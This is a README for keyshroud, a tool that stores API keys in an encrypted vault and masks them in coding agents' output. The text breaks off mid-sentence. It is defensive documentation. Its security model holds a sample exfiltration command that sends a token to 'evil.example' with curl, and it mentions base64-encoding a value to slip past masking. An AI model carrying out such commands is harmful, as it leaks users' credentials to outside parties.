<div align="center">

<h1>
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/dinhkarate/keyshroud/main/assets/brand/lockup-dark.svg">
    <img alt="keyshroud" src="https://raw.githubusercontent.com/dinhkarate/keyshroud/main/assets/brand/lockup.svg" height="88">
  </picture>
</h1>

**Your agents use the keys. They never see them.**

**Keep API keys out of Claude Code, Codex, Cursor, Cline, OpenCode, Gemini CLI, pi and omp** —
secrets stay in an encrypted vault on your machine (or in your own
[Vaultwarden](https://github.com/dani-garcia/vaultwarden) or Bitwarden, to share them between
machines), and every value is masked before the model reads it.

[![npm](https://img.shields.io/npm/v/keyshroud.svg)](https://www.npmjs.com/package/keyshroud)
[![Downloads](https://img.shields.io/npm/dm/keyshroud.svg)](https://www.npmjs.com/package/keyshroud)
[![CI](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml/badge.svg)](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Node](https://img.shields.io/node/v/keyshroud.svg)](package.json)

[🚀 Quickstart](#quickstart) · [🔐 Local vault](#the-local-vault) · [🔄 Sync with Vaultwarden](#sync-across-machines-vaultwarden-or-bitwarden) · [🔌 Supported agents](#supported-agents) · [⚙️ How it works](#how-it-works) · [❓ FAQ](#faq) · [🛡️ Security model](#security-model) · [🌐 Website](https://keyshroud.dev)

[🇻🇳 Tiếng Việt](i18n/README.vi.md) · [🇨🇳 简体中文](i18n/README.zh-CN.md) · [🇯🇵 日本語](i18n/README.ja-JP.md)

</div>

<p align="center"><img src="assets/demo.gif" alt="Demo: on a new machine, keyshroud add stores a GitHub token in the local vault through a masked prompt, keyshroud run masks it in the command's output, and scan finds a copy leaked into a file" width="860"></p>

```console
$ keyshroud run --mask -- sh -c 'echo "deploying with $GH_TOKEN"; gh api user -q .login'
deploying with <redacted:GH_TOKEN>
dinhkarate
```

The command got the real token. The transcript — and the model reading it — got
`<redacted:GH_TOKEN>`. (Masking is automatic when an agent runs the command;
`--mask` forces it in a human terminal.)

## Why keyshroud?

Coding agents need credentials to do real work: `gh`, `npm publish`, cloud CLIs,
webhooks, databases. The usual options are bad:

- ❌ **Paste the key into the chat** — now it is in the transcript, the provider's logs, and every future context window
- ❌ **Put it in `.env`** — the agent `cat`s it while debugging, or commits it
- ❌ **Pay for a secrets manager** — `op run` needs a 1Password subscription, and most "agent vaults" are hosted SaaS
- ❌ **Use a vault MCP server** — most of them return the plaintext value straight to the model

**keyshroud fixes this:**

- ✅ **Names, not values** — agents see `GH_TOKEN` and `keyshroud://GitHub token`, never the token
- ✅ **Masked output** — any value that reaches stdout/stderr becomes `<redacted:GH_TOKEN>`
- ✅ **Nothing to set up** — an encrypted vault file with its key in your OS keychain; no account, no server
- ✅ **Sync if you want it** — Vaultwarden on a $5 VPS or a Raspberry Pi, or Bitwarden, for several machines
- ✅ **Free** — MIT-licensed, no telemetry

## Features

| | |
|---|---|
| 🙈 **Masked output** | `keyshroud run` replaces every secret value in stdout/stderr with `<redacted:NAME>` — streaming-safe across chunk boundaries. |
| 🔐 **Local vault** | An AES-256-GCM file whose key is in the macOS keychain, the Linux Secret Service or Windows DPAPI (a passphrase where there is none). No account, no server, no `bw`. |
| 🪝 **Agent hooks** | The pi/omp `tool_result` hook redacts every tool result, failed ones included. Claude Code's `PostToolUse` hook redacts every *successful* tool result (Bash, Read, Grep, MCP…) — see [limits](#security-model). |
| 🔌 **MCP server** | For clients without a shell: `keyshroud mcp` gives them `secrets_run`, `secrets_list`, `secrets_request`, `vault_status`. No tool ever returns a value. |
| 🔗 **Committable references** | `keyshroud://item`, `bw://item`, `bw://item/username`, `bw://item/fields/name`, `bw://item/totp` in `.env.refs` files and templates: names, not values. |
| ⌨️ **Paste-to-create** | New secrets go through a masked prompt in the user's terminal or a masked popup in pi — never through the chat. |
| 📄 **`inject`** | Render `{{ keyshroud://… }}` and `{{ bw://… }}` templates into `0600` config files for tools that can't read env vars (`.npmrc`, kubeconfig). |
| 🔎 **`scan`** | Find vault values that leaked into your working tree (pre-commit friendly). |
| ⚡ **Fast** | The local vault answers in milliseconds, offline. With Vaultwarden: one batched `bw list items` per session instead of one `bw get` (~3 s) per secret. |
| 🔄 **Optional sync** | Vaultwarden on a $5 VPS or a Raspberry Pi, or Bitwarden, when the same secrets should reach several machines. `keyshroud://` and `bw://` references work side by side. |
| 🧾 **Audit log** | `audit.jsonl` records which *names* were used, when, by which command. Never values. |

## Supported agents

| Agent | Install | What you get |
|---|---|---|
| **Claude Code** | [plugin](#claude-code) | SessionStart + PostToolUse redaction hooks, skill |
| **pi / omp** | [`pi install npm:keyshroud`](#pi--omp) | env hydration, `tool_result` redaction (failed calls too), `/secret` |
| **Codex, OpenCode, Gemini CLI, Cursor agent** | [`npx skills add dinhkarate/keyshroud`](#other-agents-with-a-shell) | skill + CLI with masked output |
| **Claude Desktop, chat-only clients** | [`mcpServers` JSON](#mcp-clients-without-a-shell) | MCP tools with masked output |
| **Any shell or CI** | `keyshroud run -- <cmd>` | env injection + masked output |

Agents with a shell use the CLI: it costs no tool schemas in the context, and
`keyshroud run` masks output whatever the exit code. The MCP server is for
clients that cannot run commands.

## Use cases

**"Claude Code keeps reading my `.env`."** Run `keyshroud import` to move the values into
the vault and write a `.env.refs` file with lines like `GH_TOKEN=keyshroud://myapp GH_TOKEN`, then start
the agent with `keyshroud run --env-file .env.refs -- claude`. The plugin's hooks mask anything that still slips into a tool result.

**"I already self-host Vaultwarden."** Log `bw` in to it and run `keyshroud doctor`: a machine with
a `bw` login keeps Vaultwarden as the default, and keyshroud adds no server of its own.

**"I like `op run` but don't want 1Password."** `keyshroud run` is the same idea —
references in, masked output out — with the vault on your machine or on a server you host.

**"My agent needs to add a new key."** It runs `keyshroud add` or calls `secrets_request` (MCP),
and a hidden-input dialog pops up on your desktop; in pi it is `/secret`. You paste the value
there. It never enters the chat.

## Quickstart

**Requirements:** Node.js ≥ 18.19. Nothing else: no account, no server.

```bash
npm install -g keyshroud

# 1. Store a secret — typed into a masked prompt, never echoed.
#    The first one creates the local vault.
keyshroud add --env GH_TOKEN --item "GitHub token"

# 2. Use it
keyshroud run -- gh auth status
keyshroud run -- claude          # start an agent with every wired secret available

# 3. Check everything
keyshroud doctor
```

```console
$ keyshroud add --env GH_TOKEN --item "GitHub token"
Paste secret for GH_TOKEN: ****************************************
keyshroud: created the local vault ~/.config/keyshroud/vault.json; its key is in the macOS keychain (keyshroud-vault-9f2c4e6a1b3d5f70), so programs running as you can open it without asking.
created item=GitHub token env=GH_TOKEN targets=~/.config/keyshroud/env.json verified=yes
```

Without a terminal (an agent's shell), `add` opens a hidden-input dialog on your desktop instead,
so an agent can start it and you only paste. Already have a `.env`? `keyshroud import` moves it.

### The local vault

`~/.config/keyshroud/vault.json` holds every item, encrypted with AES-256-GCM under one random
256-bit key. Item names are encrypted too; the file is `0600`. Where the key lives depends on the machine:

| Machine | Key | Unlocking |
|---|---|---|
| macOS | login keychain, entry `keyshroud-vault-<id>` | none |
| macOS with `KEYSHROUD_VAULT_KEY=secure-enclave` (or `keyshroud rekey --to secure-enclave`) | wrapped to a key in the Mac's Secure Enclave | Touch ID (or the Mac's password) when a command needs a secret; a session ends after 30 minutes |
| Linux with a desktop keyring and systemd | Secret Service (`secret-tool`; found with `busctl`) | none |
| Windows | DPAPI, bound to your Windows account | none |
| Docker, servers, SSH with a locked keyring, Linux without systemd | derived from a passphrase (scrypt) | `keyshroud unlock`; a session ends after 30 minutes |

The key mode is chosen once, when the vault is created. To be asked for a passphrase on any machine,
create it with `KEYSHROUD_VAULT_KEY=passphrase keyshroud unlock` in a terminal (typed twice, at least
12 characters). When a session has ended, a command that needs a secret asks again: a masked prompt in
a terminal, a dialog on the desktop, and over SSH it tells you to run `keyshroud unlock`.

A Touch ID vault needs the Xcode Command Line Tools once (`xcode-select --install`): keyshroud builds
a small helper from `src/touchid.swift` on first use, which takes a few seconds. The sheet appears for
any caller that may ask (the CLI, `secrets_run`, Claude Code's apiKeyHelper); hooks, `status` and
`doctor` never ask, and over SSH it tells you to run `keyshroud unlock` at the Mac. `keyshroud rekey`
moves a vault between key types (a new key and vault id each time); run `rekey --to passphrase` before
moving to another Mac.

Nothing can recover a lost key or a forgotten passphrase, and the vault belongs to one machine.
`vault.json` is safe to copy as long as its key is not. For backups and several machines, use
Vaultwarden or Bitwarden.

### Sync across machines: Vaultwarden or Bitwarden

Keep the secrets in Vaultwarden or Bitwarden instead to have them on several machines; `run`, the
hooks, the MCP server and everything else work the same, through the Bitwarden CLI.

**Get a vault** — pick one:

- **Self-host Vaultwarden** (free, your server): follow
  [examples/vaultwarden](examples/vaultwarden#readme) — Docker Compose + Caddy with automatic HTTPS,
  from an empty VPS to `keyshroud doctor`, plus backups and hardening.
- **Bitwarden cloud** (free account, no server): sign up at [bitwarden.com](https://bitwarden.com)
  and skip `bw config server` below (EU accounts: `bw config server https://vault.bitwarden.eu`).

```bash
npm install -g @bitwarden/cli

# 1. Point bw at your server and log in once
bw config server https://vault.example.com
bw login

# 2. Make it the default for new items (keyshroud:// items keep working)
mkdir -p ~/.config/keyshroud && echo bw > ~/.config/keyshroud/backend

# 3. Unlock for 30 minutes (asks for the master password, which is not stored)
keyshroud unlock

# 4. Check everything
keyshroud doctor
```

keyshroud picks the default once per machine and writes it to `~/.config/keyshroud/backend`:
Vaultwarden when it finds a `bw` login or anything keyshroud 0.7 left behind, so upgrades change
nothing; the local vault otherwise. `KEYSHROUD_BACKEND=local|bw` overrides it, and `keyshroud setup`
switches to Vaultwarden by itself. References name their vault, so `keyshroud://…` and `bw://…` items work
side by side, and `--item keyshroud://Name` or `--item bw://Name` picks one for a single item.

keyshroud never stores the master password unless you do. When Vaultwarden is locked
and a command needs a secret, it asks: a masked prompt in a terminal, a native dialog
on the desktop (so an agent's command waits for you), and over SSH it tells you to run
`keyshroud unlock`. A session ends after 30 minutes (`KEYSHROUD_SESSION_TTL_MS`): a timer
runs `bw lock`, so a copied session token stops working too. On a host nobody sits at,
`keyshroud unlock --unattended` asks once, in a terminal only, and opens a session without an end.

To unlock without being asked, store the master password in the OS keychain
(`security add-generic-password -a "$USER" -s vaultwarden-master-password -w`, or
`secret-tool store` on Linux; after `setup` the entry is `keyshroud-master-password`; see the
[vault setup guide](examples/vaultwarden#optional-unlock-without-being-asked)). Any program running
as you can then read it, agents included. Windows has no keychain support for it.

### Least privilege: a separate agent account

With the steps above, an unlocked session opens your whole Vaultwarden vault, and an agent that
runs `bw` as you can use it. `setup` gives keyshroud its own `bw` login on a dedicated
account instead, which holds only the secrets agents need:

```bash
keyshroud setup --email you+agent@example.com   # opens the signup page, then logs in with the
                                                 # new master password (asked, not stored);
                                                 # no `bw config server`: Bitwarden cloud
keyshroud migrate                                # dry run: which wired items would be copied
keyshroud migrate --yes                          # copy them; references keep working
```

- The agent login lives in `~/.config/keyshroud/bw` (`BITWARDENCLI_APPDATA_DIR`). Your own `bw`
  login is untouched. Its master password is not stored: keyshroud asks for it when a session
  ends and keeps only a scrypt hash, so `add` can refuse it as a secret.
- `migrate` copies the items that wired names (and any `--env-file` / `--item`) reference, with
  the same names, then locks your personal vault again. Originals stay where they are. It asks
  for your personal master password in a terminal (or reads the keychain entry `vaultwarden-master-password`).
- An agent can run `setup` too. Without a terminal it opens the signup page, where you pick the
  agent account's master password yourself (save it in your password manager); then the agent
  runs `setup --registered`, which asks for it in a dialog. The password never passes through
  anything the agent can read. `--confirm-unlock` and `--unattended` need a terminal.
- `--confirm-unlock` (macOS) stores the master password in the keychain entry
  `keyshroud-master-password` so that macOS asks you before every read, i.e. every unlock.
- If bw loses the login (a rejected refresh token logs it out), keyshroud on a Mac with the
  master password in the keychain asks for Touch ID and logs the agent account back in.
- `--unattended` (hosts nobody sits at, e.g. over `ssh -t`) logs in with a session without an
  end. Unlock it again with `keyshroud unlock --unattended`.
- Self-hosted Vaultwarden with `SIGNUPS_ALLOWED=false`: invite the address from the admin page
  (`/admin`), or allow signups for a minute, then pass `--registered` once the account exists.

## How it works

```
              ┌──────────────────────────── your machine ─────────────────────────────┐
              │  vault.json ◄── key: keychain · Secret Service · DPAPI · passphrase   │
              │      │                                                                │
              │      ▼                                                                │
 Vaultwarden ◄┼─bw─ keyshroud ── resolves keyshroud:// and bw:// refs ──► command's env   │
 (optional)   │      ▲                                                   │            │
              │      └──── redactor ◄──── stdout / stderr ◄──────────────┘            │
              │                │ <redacted:NAME>                                      │
              └────────────────┼──────────────────────────────────────────────────────┘
                               ▼
                  agent transcript / LLM provider
```

1. **Wiring.** A secret is wired by *name*: `GH_TOKEN → keyshroud://GitHub token` (or
   `bw://GitHub CLI token`). Wiring lives in `~/.config/keyshroud/env.json` and in project `.env.refs`
   files. When pi or omp is installed (`~/.pi/agent`, `~/.omp/agent` exists), a name is also
   written to its `auth.json`, where pi/omp run the `!keyshroud get '…'` entries on their own
   (`--target pi|omp|both` writes there in any case). All of these are safe to read.
2. **Unlock.** The local vault's key comes from the OS keychain, or from a passphrase session that
   ends after 30 minutes. Vaultwarden: keyshroud asks for the master password (or reads one you
   stored in the OS keychain); the session token is cached in `~/.config/keyshroud/session`
   (`0600`) and locked again after 30 minutes.
3. **Resolve.** `keyshroud://` references are read from the vault file; `bw://` references resolve
   from one `bw list items` snapshot held in memory for `KEYSHROUD_CACHE_TTL_MS` (default 1 h).
4. **Inject.** Values go into the child process environment — never into argv
   or tool results (`inject` writes `0600` files only when you ask it to).
5. **Redact.** In-process (`run`, MCP, pi/omp) output passes through a redactor
   that knows every wired value, the session token or vault key, and every value in
   the vault. Out-of-process Claude Code hooks use a keyed-HMAC
   fingerprint index (`redact-index.json`, `0600`) of wired values, values you
   printed with `get`, `inject` or `api-key`, and the session token or key only,
   so they never hold plaintext or fingerprint the rest of your vault.

## Claude Code

Install the CLI, then the plugin (redaction hooks + skill):

```bash
npm install -g keyshroud
```
```text
/plugin marketplace add dinhkarate/keyshroud
/plugin install keyshroud@keyshroud
```

What you get:

- **SessionStart hook** — refreshes the redaction index and tells Claude which
  secret *names* exist. It never asks for a master password or passphrase: with a
  locked vault it tells Claude to ask you to run `keyshroud unlock`.
- **PostToolUse hook** — rewrites any successful tool result that contains a
  wired value or the vault session token to `<redacted:NAME>` using Claude
  Code's `updatedToolOutput` (tested with Claude Code 2.1.296).
  **Limit:** when a command fails, Claude Code fires `PostToolUseFailure`, which
  cannot rewrite output. The skill and session context therefore tell Claude to
  run every secret-using command through `keyshroud run`, which masks inside
  the process regardless of the exit code.
- **Skill** — teaches Claude to use names and references, never values.

Claude uses the CLI from its Bash tool, so the plugin adds no MCP server (since
0.6.1). To add one anyway: `claude mcp add keyshroud -- keyshroud mcp`.

The plugin calls `keyshroud` from `PATH`. If Claude Code is launched from a GUI
that doesn't see your npm/nvm bin directory, run `keyshroud link-cli` (links it
into `~/.local/bin`) and make sure that directory is on the GUI's `PATH`.

To give Bash commands the secrets as env vars, start Claude through keyshroud:

```bash
keyshroud run -- claude
```

Use a vault item as Claude Code's own API key (`apiKeyHelper`):

```bash
keyshroud claude-setup --item "Anthropic API key" --ttl-ms 600000
```

It backs up `settings.json` first and refuses to replace an existing helper
without `--force`.

## pi / omp

```bash
pi install npm:keyshroud
```

The extension:

- hydrates wired secrets into the agent's environment before provider auth
  resolves, so `$CUSTOM_KEY` provider references work at startup;
- redacts every tool result, successful or failed, through the `tool_result`
  hook (wired values, the session token or vault key, and every password in the vault);
- with a passphrase vault, takes its values out of the agent's environment once the
  session ends or you run `keyshroud lock`, checked before every tool and `!command`;
- adds `/secret` (describe → confirm name → masked paste), `/vault_add`,
  `/vault_wire`, `/vault_rotate`, `/vault_status`, and the `vault_add_secret` /
  `vault_status` tools.

`/secret` can ask a local OpenAI-compatible model to propose the item and
variable names. Only your description is sent — never the value:

```bash
export KEYSHROUD_PLANNER_URL=http://127.0.0.1:8080/v1/chat/completions
export KEYSHROUD_PLANNER_MODEL=qwen3-4b
```

Without a planner, names are derived from the description and you can edit them.

## Other agents with a shell

Codex, OpenCode, Gemini CLI, Cursor's agent and anything else that can run commands: install the
CLI and the skill, which teaches the agent to run secret-using commands as `keyshroud run -- …`
and to store new secrets with `keyshroud add`:

```bash
npm install -g keyshroud
npx skills add dinhkarate/keyshroud
```

`npx skills` needs Node.js 22.20+. On an older Node, copy the skill that comes with the CLI;
Codex and OpenCode read `~/.agents/skills`:

```bash
mkdir -p ~/.agents/skills && cp -R "$(npm root -g)/keyshroud/skills/keyshroud" ~/.agents/skills/
```

## MCP clients without a shell

Claude Desktop, chat-only clients, or an agent you do not allow to run commands. Any client that
speaks MCP over stdio:

```json
{ "mcpServers": { "keyshroud": { "command": "keyshroud", "args": ["mcp"] } } }
```

Codex, if you want MCP there too: `codex mcp add keyshroud -- keyshroud mcp`. Non-interactive `codex exec` refuses MCP calls that need approval; allow keyshroud's tools explicitly:

```toml
# ~/.codex/config.toml
[mcp_servers.keyshroud.tools.secrets_run]
approval_mode = "approve"
```

OpenCode: `opencode mcp add keyshroud -- keyshroud mcp`.

| Tool | Does | Returns |
|---|---|---|
| `secrets_list` | Lists wired names (+ optional `env_file`) | resolved / unresolved names |
| `secrets_run` | Runs a shell command with secrets injected (`only`, `env_file`, `cwd`, `timeout_ms`) | exit code + masked stdout/stderr |
| `secrets_request` | Opens a hidden-input dialog on the user's desktop and stores the value | `created … verified=yes`, or a `keyshroud add …` command for *their* terminal when no dialog can be shown |
| `vault_status` | Which vault, lock state, item count | status line |

## CLI reference

```text
keyshroud get <ENV_NAME | keyshroud://ref | bw://ref>   print one value (for scripts; not for agents)
keyshroud run [--env-file F]... [--only A,B] [--no-auth] [--mask|--no-mask] -- <cmd>
keyshroud inject [-i template] [-o out] [--force]
keyshroud redact < log.txt
keyshroud scan [paths...]
keyshroud env [--shell]
keyshroud add --env NAME --item ITEM [--notes TEXT] [--target pi|omp|both] [--stdin|--dialog]
keyshroud import [--from F|-] [--out F] [--prefix P] [--only A,B] [--skip A,B] [--yes] [--replace] [--force]
keyshroud rotate --item ITEM [--stdin|--dialog]
keyshroud wire --env NAME --item ITEM [--target pi|omp|both] [--force]
keyshroud unwire --env NAME [--target pi|omp|both]
keyshroud list                                     item references and the variables wired to them (names only)
keyshroud rm --item ITEM [--yes]                   delete an item and unwire it (dry run unless --yes)
keyshroud setup --email EMAIL [--server URL] [--confirm-unlock | --unattended] [--registered]   (Vaultwarden)
keyshroud migrate [--item NAME]... [--env-file F]... [--yes]                                    (Vaultwarden)
keyshroud migrate --to local [--yes]                                                            (Vaultwarden -> local vault)
keyshroud unlock [--unattended | --stdin]
keyshroud rekey [--to keychain|secure-enclave|passphrase|dpapi]                                 (in a terminal)
keyshroud status | lock | doctor
keyshroud mcp
keyshroud hook claude <session-start|post-tool-use>
keyshroud claude-setup --item ITEM [--settings PATH] [--ttl-ms N] [--force]
keyshroud api-key --item ITEM
keyshroud link-cli [--dir DIR] [--force]
```

`--item` takes a name (stored in the default vault), `keyshroud://Name` or `bw://Name`.

`rm` prints what it would do (delete a local item permanently, or move a bw item to the bw trash, and
which variables it unwires) until you add `--yes`. With `--yes` it needs a terminal, or
a Touch ID approval on a Mac when an agent runs it. It works on bw only with keyshroud's own agent
account, and refuses the item Claude Code's apiKeyHelper uses. `.env.refs` files that point at a
removed item then fail as unresolved.

`run` masks output whenever stdout is not a terminal (agents, CI, pipes) and
passes the TTY through untouched for interactive use. Force either way with
`--mask` / `--no-mask`. `exec` is an alias of `run`.

`add` and `rotate` read the value from a masked prompt that shows `*` per
character. Without a terminal (an agent's shell), they open a native hidden-input
dialog instead (`osascript` on macOS, `zenity` or `kdialog` on Linux, PowerShell on Windows), so the agent
can start the command and you only paste. Over SSH or without a display, pipe the
value with `--stdin`.

`import` reads a `.env` (default `./.env`), decides which lines are secrets (by name, such as
`*_TOKEN` or `*_KEY`, or by value, such as `sk-…` or a URL with a password), and prints a plan of
names only. Nothing is written until you add `--yes`: it then creates one vault item per secret,
named `<prefix> NAME` (prefix defaults to the directory name), reads each value back to verify it,
and writes `.env.refs` (`NAME=keyshroud://<prefix> NAME`) with comments and non-secret lines kept. Re-running reuses items that already
hold the same value and stops on a conflicting one. `--replace` rewrites the source file in place
instead (atomically, no backup copy). Multiline values, `${VAR}` expansion and duplicate keys are
rejected with the line number, never the value.

```bash
keyshroud import                 # dry run: which names would move
keyshroud import --yes           # store them and write .env.refs
keyshroud run --env-file .env.refs -- npm test
```

**Exit codes:** `0` ok · `2` usage · `3` vault locked or unavailable · `4` secret
missing or item name ambiguous · `5` refusing to overwrite existing state.
`run` exits with the child's code.

### References

| Reference | Resolves to |
|---|---|
| `keyshroud://GitHub token` | the value stored in the local vault |
| `keyshroud://GitHub token/notes` | its notes (`id` also works) |
| `!keyshroud get 'keyshroud://Item'` | the env.json / auth.json form keyshroud writes for local items |
| `bw://GitHub CLI token` | login password |
| `bw://GitHub CLI token/username` | login username (`notes`, `uri`, `id` also work) |
| `bw://Sentry/fields/dsn` | custom field `dsn` |
| `bw://AWS root/totp` | current TOTP code |
| `bw://a%2Fb` | item named `a/b` (`keyshroud://a%2Fb` alike) |
| `!bw get password 'Item'` | legacy auth.json form, still supported |
| `local://GitHub token` | the first spelling of `keyshroud://`, still read the same way |

Item lookup is case-insensitive by name or exact by id. Duplicate names fail
closed (exit `4`) instead of guessing; the local vault refuses to create one.

### Configuration

| Variable | Default | |
|---|---|---|
| `KEYSHROUD_BACKEND` | the `backend` file | `local` or `bw`: where new items go and which vault opens by default |
| `KEYSHROUD_VAULT_KEY` | per OS | key mode when the local vault is created: `keychain`, `dpapi`, `passphrase` or `secure-enclave` (Touch ID); anything else is an error |
| `KEYSHROUD_CACHE_TTL_MS` | `3600000` | in-memory Vaultwarden snapshot + session check lifetime; `0` disables |
| `KEYSHROUD_SESSION_TTL_MS` | `1800000` | how long an unlocked session lasts (Vaultwarden, or a passphrase or Touch ID vault) |
| `KEYSHROUD_LOCK_TIMER` | on | `0` skips the background timer (sessions then end on the next call) |
| `KEYSHROUD_CONFIG_DIR` | `$XDG_CONFIG_HOME/keyshroud` | `vault.json`, `env.json` (wiring), `backend`, sessions, `bw/` (after `setup`), master-password hash, redact index, audit log |
| `KEYSHROUD_KEYCHAIN_MASTER` | `vaultwarden-master-password` | keychain service names (after `setup`: `keyshroud-…`) |
| `KEYSHROUD_KEYCHAIN_CLIENT_ID` | `vaultwarden-api-client-id` | |
| `KEYSHROUD_KEYCHAIN_CLIENT_SECRET` | `vaultwarden-api-client-secret` | |
| `KEYSHROUD_AUDIT` | on | `0` disables `audit.jsonl` |
| `KEYSHROUD_PLANNER_URL` / `_MODEL` / `_API_KEY` | unset | optional naming helper for `/secret` |

## FAQ

**Do I need Vaultwarden?** No. Secrets live in an encrypted file on your machine by default.
Vaultwarden (or the official Bitwarden cloud) is optional: use it to have the same secrets on several
machines, or a copy on a server.

**Do secrets leave my machine?** Not with the local vault. With Vaultwarden or Bitwarden, only between
`bw` and your server. keyshroud has no backend of its own and sends no telemetry; values go into the
environment of the command you run.

**I used keyshroud 0.7. What changes?** Nothing. A machine with a `bw` login, keyshroud's files, wired
`bw://` or `!bw` entries, `BW_SESSION`, or the master password in the keychain keeps Vaultwarden as the
default and writes that down in `~/.config/keyshroud/backend`. Only a machine where none of these exist
looks new and gets the local vault; set `KEYSHROUD_BACKEND=bw` there if it should not.

**How do I leave Vaultwarden?** `keyshroud migrate --to local` shows which Vaultwarden items your wired
names use; `--yes` copies them into the local vault, checks each copy, rewires the names and makes the
local vault the default for new items. A field other than the password becomes an item of its own
(`Sentry (field dsn)`). Vaultwarden keeps the originals, the previous references are saved next to the
vault (names and references only), and `.env.refs` files keep their `bw://` references until you change
them. Other machines that use the same Vaultwarden are not affected.

**How do I back up the local vault?** `vault.json` is encrypted, so copy it anywhere; it opens only with
its key, which stays in this machine's keychain (or your passphrase). If you lose the machine, you lose
the key. For a real backup, or the same secrets on several machines, use Vaultwarden or Bitwarden.

**Can I use it in CI or a Docker build?** Yes, with a passphrase vault. Create it once in a terminal
(`KEYSHROUD_VAULT_KEY=passphrase keyshroud unlock`), add the secrets, and copy `vault.json` into the job
(it is encrypted, so it can live in the repository or an artifact). Keep only the passphrase in the CI's
secret store, then:

```bash
mkdir -p ~/.config/keyshroud && cp vault.json ~/.config/keyshroud/
printf '%s' "$KEYSHROUD_PASSPHRASE" | keyshroud unlock --stdin   # a session of 30 minutes
keyshroud run --env-file .env.refs -- npm test
```

`--stdin` only opens an existing passphrase vault; a new passphrase is always chosen in a terminal. A
server you reach over SSH can instead run `keyshroud unlock --unattended` there once (no time limit).

**Can the agent still use the key?** Yes. The command gets the real value; only the text
the model reads is masked.

**Is this a sandbox?** No. It stops *accidental* disclosure. A hostile or prompt-injected
agent can still exfiltrate a value it can use — see the [security model](#security-model).

**Why not just `.gitignore` my `.env`?** That stops commits, not reads. Agents read `.env`
to debug, and whatever they read goes to the model provider.

**Does it work on Windows?** Yes, tested on Windows 10 with Node 22. The local vault keeps its key
with DPAPI, bound to your Windows account. `bw` and other npm CLIs (`.cmd` shims) run without a shell,
the unlock dialog is a small PowerShell window, and sessions end after 30 minutes like elsewhere. Files in
`%USERPROFILE%\.config\keyshroud` are protected by your profile's ACL (you, SYSTEM, Administrators), not
by `0600`. One gap: over an SSH session with a terminal (`ssh -t`), Windows ends the lock timer when the
SSH session closes, so that session ends on the next keyshroud call instead. There is no keychain support
for the Vaultwarden master password on Windows: keyshroud asks for it, and `migrate` cannot run there.
DPAPI may be refused over SSH with a key (`Access is denied`): such a login carries no Windows
password. keyshroud says so; run the command in the desktop or RDP session, or give a machine used only
over SSH a passphrase vault (`keyshroud rekey --to passphrase`).

**`bw login` prints `KeyIdBackfillError`?** `bw` 2026.9 and later call an endpoint that Vaultwarden
added in 1.37.4 ([vaultwarden#7750](https://github.com/dani-garcia/vaultwarden/issues/7750)). The login
is saved anyway (`bw status` says `locked`), and `keyshroud setup` and the API-key login carry on by
themselves. Update Vaultwarden to 1.37.4 or later to make the error go away.

## Security model

keyshroud protects against **accidental disclosure**: secrets ending up in
transcripts, provider logs, screenshots, commits, or the model's context because
a command printed them.

It does **not** make a hostile or prompt-injected agent safe. An agent that can
run `keyshroud run -- curl https://evil.example -d "$TOKEN"`, or base64-encode a
value before printing it, can exfiltrate it. If that is your threat model, use
an egress proxy that swaps placeholder credentials on the wire (for example
Infisical Agent Vault or OneCLI), restrict which secrets each session
gets with `--only`, and keep a human approving commands.

**The local vault** is encrypted at rest (AES-256-GCM); its key is in your OS keychain (macOS
keychain, Linux Secret Service, Windows DPAPI). Any program running as you can read that key, agents
included, so in this mode keyshroud does not ask before opening the vault: the same exposure as storing
a Vaultwarden master password in the keychain, and weaker than Vaultwarden's ask-every-30-minutes
default. Create the vault with `KEYSHROUD_VAULT_KEY=passphrase` to be asked (sessions end after 30
minutes).

On a Mac, a **Touch ID vault** (`KEYSHROUD_VAULT_KEY=secure-enclave`, or `keyshroud rekey --to
secure-enclave`) closes that gap while no session is open: its key is wrapped to a P-256 key held by
the Mac's Secure Enclave, which answers only after the person at the Mac approves a Touch ID sheet (or
types the Mac's password). For the session that follows (30 minutes), the key sits in `vault.session` +
`vault.token` like a passphrase session, and any program running as you can read it; `keyshroud lock`
or a shorter `KEYSHROUD_SESSION_TTL_MS` narrows that window. Touch ID proves someone is present, not
what they meant to approve: a program already running as you can show its own sheet, or change
keyshroud or its helper to capture the next approval. There is no recovery: the vault opens on that
Mac only, so run `rekey --to passphrase` before erasing or moving it, and keep Vaultwarden for
backups. A local vault belongs to one machine and has no recovery: back up with Vaultwarden or
Bitwarden, which is also the option for several machines. `vault.json` is safe to copy only as long as
its key is not.

Guarantees we test for:

- secret values never appear in argv, logs, diagnostics, MCP results, hook
  output, or `audit.jsonl`;
- new secrets are read from a masked prompt, `--stdin`, or a native dialog, never flags;
- the dialog an agent can open says it was requested by a program, warns against the
  master password, refuses names that are not one printable line, refuses the master
  password itself, and opens one at a time (30 s pause after a cancel);
- the session file, local vault, redact index, rendered templates and auth files are `0600`;
- the local vault is replaced atomically (temporary file, fsync, rename) under a lock, changes to any
  part of it fail its integrity check, and a vault that fails it is never overwritten;
- a local vault's passphrase is set only in a terminal, never stored, and refused as a secret;
- env.json and auth.json writes are locked and atomic and never overwrite without `--force`;
- commands started by `run` and `secrets_run` never receive `BW_SESSION`,
  `BW_PASSWORD`, `BW_CLIENTID` or `BW_CLIENTSECRET`, so `--only` really limits
  what a command can read (inside pi/omp the agent process keeps the session for
  legacy `!bw` auth entries; its value is redacted from tool output);
- env files may contain only references and literals: a `!command` value is
  rejected, and so are variables that change what programs load or run (`PATH`,
  `NODE_OPTIONS`, `LD_*`, `DYLD_*`, `BASH_ENV`, `GIT_SSH_COMMAND`, …), which are
  also never wired or injected (the list covers the common ones, not every tool's:
  an env file still configures the program it is used with);
- an unparseable `env.json` or `auth.json` is never overwritten.

Known limits: the local vault's integrity check proves a file was sealed with its key, not that it is
the latest one or who sealed it. A program that can write `vault.json` can put an older copy back, and
can replace a Touch ID vault with a new one made for the same Secure Enclave key (the public half is in
the file), which then opens on your next approval with its contents instead of yours; neither reveals
what the vault held. A `.env.refs` can reference **any** item in your vault, not only the
ones you wired, so read a cloned repo's `.env.refs` before running `--env-file`
with it. `import` decides what is secret by heuristics and keeps everything else
as a literal; check its plan before committing `.env.refs`. The Claude Code
`PostToolUse` hook does not see failed commands (`PostToolUseFailure` cannot
rewrite output) or anything a client sends as telemetry, and it only knows wired
values and values keyshroud itself printed (`get`, `inject`, `api-key`), so a failed
`keyshroud get bw://…` or `run --no-mask` still shows in the clear; run
